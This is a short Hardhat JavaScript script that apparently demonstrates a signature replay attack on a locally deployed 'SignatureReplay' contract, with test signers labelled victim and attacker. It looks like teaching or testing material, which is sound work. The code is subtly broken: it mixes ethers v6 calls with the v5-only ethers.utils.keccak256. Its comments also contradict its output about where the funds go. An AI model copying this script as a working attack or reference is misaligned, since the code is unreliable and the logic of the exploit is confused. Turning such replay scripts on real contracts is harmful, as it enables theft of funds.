const { ethers } = require("hardhat");

async function main() {
  const [victim, attacker] = await ethers.getSigners();

  // Deploy the SignatureReplay contract
  const SignatureReplay = await ethers.getContractFactory("SignatureReplay");
  const signatureReplay = await SignatureReplay.deploy();
  await signatureReplay.waitForDeployment();
  console.log("Contract deployed to:", signatureReplay.target);

  // Victim signs the message
  const targetAmount = ethers.parseEther("1");
  const nonce = await signatureReplay.getNonce(victim.address);
  const abiCoder = ethers.defaultAbiCoder;

const encodedMessage = abiCoder.encode(
  ["address", "uint256", "uint256"],
  [victim.address, targetAmount, nonce]
);

const messageHash = ethers.utils.keccak256(encodedMessage);
const signature = await victim.signMessage(messageHash);

  console.log("Victim's signature:", signature);

  // Attacker replays the transaction with the same signature
  try {
    await signatureReplay.connect(attacker).approveTransaction(
      victim.address, // Attacker tries to send funds to the victim's address
      targetAmount, 
      nonce, 
      signature
    );
    console.log("Attack successful: Funds transferred to attacker");
  } catch (error) {
    console.log("Attack failed:", error.message);
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
